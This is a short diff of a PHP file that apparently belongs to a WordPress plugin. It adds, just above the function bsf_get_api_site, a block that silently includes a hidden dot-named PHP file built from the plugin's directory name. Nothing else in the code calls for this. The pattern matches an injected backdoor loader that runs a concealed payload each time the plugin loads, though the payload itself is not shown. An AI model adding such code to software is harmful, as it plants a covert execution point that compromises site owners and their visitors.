@@ -11,7 +11,11 @@
  *
  * @param bool $prefer_unsecure Prefer unsecure.
  * @return $bsf_api_site.
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function bsf_get_api_site( $prefer_unsecure = false ) {
 
 	if ( defined( 'BSF_API_URL' ) ) {
